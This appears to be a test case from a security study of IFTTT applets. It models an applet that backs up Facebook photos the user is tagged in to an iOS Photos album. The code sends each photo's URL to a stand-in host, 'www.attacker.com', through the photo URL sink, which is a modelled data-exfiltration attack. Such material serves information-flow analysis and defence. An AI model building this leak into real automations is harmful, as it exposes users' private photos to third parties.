//Maker: devin
//Link2Applet: https://ifttt.com/applets/126727p-back-up-photos-you-re-tagged-in-on-facebook-to-an-ios-photos-album
//Title of Applet:  Back up photos you're tagged in on Facebook to an iOS Photos album
//Trigger service: Facebook
//Action service: iOS Photos
//Policy/Presence:  Confidentiality of Facebook Photos / NO


url = lbl("Facebook.youAreTaggedInAPhoto.ImageSource");
attack = urll("www.attacker.com?" + url);
sink('IosPhotos.createPhotoIosPhotos', 'setAlbum', 'My Facebook Photos');
sink('IosPhotos.createPhotoIosPhotos', 'setPhotoUrl', attack);
